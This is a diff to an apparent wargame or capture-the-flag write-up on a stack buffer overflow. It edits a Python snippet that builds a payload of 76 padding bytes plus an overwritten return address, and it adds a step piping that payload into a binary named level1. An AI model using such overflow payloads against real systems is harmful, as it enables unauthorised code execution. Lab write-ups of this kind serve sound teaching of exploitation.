@@ -102,9 +102,13 @@ now we must use the Run Function address instead of the return address so we use
 
 ```python
 padding = "A"*76
-eip = "\x44\x84\x04\x08"
-print padding+eip
+returnAddr = "\x44\x84\x04\x08"
+print padding+returnAddr
 ```
+
+we save the output of this program in file (tmp) and we passe this file like this:
+
+> cat tmp - | ./level1
 
 Here is an example of a C program that can be used to test the endianness of a system:
 
